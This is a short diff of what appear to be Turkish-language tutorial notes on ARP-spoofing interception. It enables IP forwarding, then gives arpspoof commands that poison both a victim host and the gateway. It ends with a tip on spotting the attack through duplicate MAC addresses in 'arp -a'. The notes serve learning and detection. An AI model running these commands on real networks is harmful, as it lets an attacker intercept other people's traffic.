@@ -35,7 +35,7 @@
 ~echo 1 > /proc/sys/net/ipv4/ip_forward //Normalde bir bilgisayar, gelen IP paketlerini sadece kendisine yönlendirilmişse işler. Ancak bu komut sayesinde o bilgisayar, gelen IP paketlerini başka bir cihaza yönlendirebilir hale gelir. Yani, bilgisayar bir router (yönlendirici) gibi davranır.
 
 ~arpspoof -i eth0 -t 10.0.2.6 10.0.2.1 //saldırı
-~arpspoof -i eth0 -t 10.0.2.1 10.0.2.6 //2 terminalle hem modeme hem
+~arpspoof -i eth0 -t 10.0.2.1 10.0.2.6 //2 terminalle hem modeme hem saldırılacak kişiye
 
 ~arp -a //saldırılan bilgisayar da bu komutu çalıştırdığında aynı mac adresine sahip iki cihaz görürsen saldırıya uğruyorsun
 
